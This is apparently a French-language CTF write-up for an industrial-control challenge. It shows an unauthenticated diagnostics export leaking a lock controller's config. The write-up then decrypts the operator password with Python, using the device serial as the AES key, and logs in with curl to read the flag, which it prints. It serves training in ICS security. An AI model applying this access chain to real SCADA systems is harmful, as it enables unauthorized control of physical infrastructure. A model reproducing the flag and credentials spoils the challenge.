---
title: "Sail Away Q3 · Welcome to the Machine"
platform: "HackerLab Benin 2026"
category: "ics"
difficulty: "—"
points: 100
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/sail-away/03-welcome.md"
tags: [hackerlab-benin-2026, ics]
status: published
---

# Sail Away : Q3 · Welcome to the Machine (100 pts)

> *« Le RAVN sort par l'Écluse Est. HMI SCADA : Poste de supervision. »*

## TL;DR

Le portail de diagnostic exporte la config du contrôleur **non authentifié**. Le mot de passe de l'opérateur est chiffré en **AES-256-CBC** avec le **serial du device** comme clé. Login → le flag est dans `/api/state`.

**Flag** : `HLB2026{c23a3781811e960f5d4561f95b547439}`

## Export de config

Le bouton *Diagnostics / Maintenance* appelle `/api/diag/export`, sans auth :

```ini
; LockCtl device configuration export
[device]
model      = LockCtl-3200
firmware   = 3.2
serial     = 7K3MLCX320A1F9E2D4B6C8A0E3F1B7D2
modbus     = tcp/502

[auth]
realm      = operator
username   = oper
cipher     = aes-256-cbc
secret     = nxxCp+CzXWZIqgwX3pLzsXFTVvfL4Il0d++hTKCHO/w=
```

Le serial fait **32 caractères ASCII** = **32 octets** = taille d'une clé AES-256.

## Déchiffrement

Le `secret` base64 fait 32 octets = `IV (16)` + `ciphertext (16)` :

```python
import base64
from Crypto.Cipher import AES

SERIAL = b"7K3MLCX320A1F9E2D4B6C8A0E3F1B7D2"
blob = base64.b64decode("nxxCp+CzXWZIqgwX3pLzsXFTVvfL4Il0d++hTKCHO/w=")
pt = AES.new(SERIAL, AES.MODE_CBC, blob[:16]).decrypt(blob[16:])
print(pt)
# b'C1tadel-L0ck!\x03\x03\x03'  → "C1tadel-L0ck!"
```

## Login et lecture d'état

```bash
curl -c cookies -X POST http://172.28.X.2:8080/api/login \
     -H "Content-Type: application/json" \
     -d '{"u":"oper","p":"C1tadel-L0ck!"}'

curl -b cookies http://172.28.X.2:8080/api/state
```

Réponse :

```json
{
  "firmware": "LockCtl v3.2 · build HLB2026{c23a3781811e960f5d4561f95b547439}",
  "online": false,
  "user": "oper"
}
```

## Flag

```
HLB2026{c23a3781811e960f5d4561f95b547439}
```
